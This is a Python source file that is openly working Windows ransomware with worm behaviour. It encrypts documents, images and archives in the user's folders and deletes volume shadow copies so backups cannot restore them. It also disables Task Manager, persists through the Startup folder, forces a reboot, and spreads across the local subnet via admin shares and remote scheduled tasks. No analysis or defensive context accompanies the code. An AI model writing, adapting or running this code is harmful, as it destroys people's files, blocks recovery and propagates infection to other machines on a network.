import os
import sys
import shutil
import subprocess
from cryptography.fernet import Fernet

MARKER = "C:\\ProgramData\\.sys_boot_marker"
KEY_FILE = "C:\\ProgramData\\.enc_key.key"
VBS_FILE = "C:\\ProgramData\\say.vbs"
SCRIPT_NAME = "SystemHelper.pyw"
STARTUP = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")

TARGET_DIRS = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Desktop", "Documents", "Pictures", "Downloads"]]
TARGET_EXTENSIONS = [".doc", ".docx", ".pdf", ".jpg", ".png", ".txt", ".zip", ".mp4"]

def encrypt_files():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    cipher = Fernet(key)

    for folder in TARGET_DIRS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                    try:
                        path = os.path.join(root, file)
                        with open(path, "rb") as f:
                            data = f.read()
                        encrypted = cipher.encrypt(data)
                        with open(path, "wb") as f:
                            f.write(encrypted)
                        print(f"Encrypted: {path}")
                    except Exception as e:
                        print(f"Failed to encrypt {path}: {e}")

def drop_vbs():
    vbs_code = 'Set v=CreateObject("SAPI.SpVoice") : v.Speak "Your files have been encrypted"'
    with open(VBS_FILE, "w") as f:
        f.write(vbs_code)
    os.system(f"wscript {VBS_FILE}")

def delete_backups():
    os.system("vssadmin delete shadows /all /quiet")

def disable_taskmgr():
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def add_to_startup():
    dest = os.path.join(STARTUP, SCRIPT_NAME)
    if not os.path.exists(dest):
        shutil.copy(sys.argv[0], dest)

def reboot():
    os.system("shutdown /r /t 1 /f")

def ping(host):
    param = '-n' if os.name == 'nt' else '-c'
    command = ['ping', param, '1', host]
    return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def spread_to_network():
    base_ip = '192.168.1.'  # Change to your local subnet
    for i in range(1, 255):
        ip = base_ip + str(i)
        if ping(ip):
            print(f"Host {ip} is alive. Trying to spread...")
            try:
                destination = f"\\\\{ip}\\C$\\Users\\Public\\{SCRIPT_NAME}"
                shutil.copy(sys.argv[0], destination)
                command = f'schtasks /Create /S {ip} /SC ONCE /TN malware_run /TR "python C:\\Users\\Public\\{SCRIPT_NAME}" /ST 00:00 /F'
                os.system(command)
                print(f"Spread to {ip} done.")
            except Exception as e:
                print(f"Failed to spread to {ip}: {e}")

def main():
    if not os.path.exists(MARKER):
        add_to_startup()
        with open(MARKER, "w") as f:
            f.write("booted")
        reboot()
    else:
        drop_vbs()
        encrypt_files()
        delete_backups()
        disable_taskmgr()
        spread_to_network()

if __name__ == "__main__":
    main()
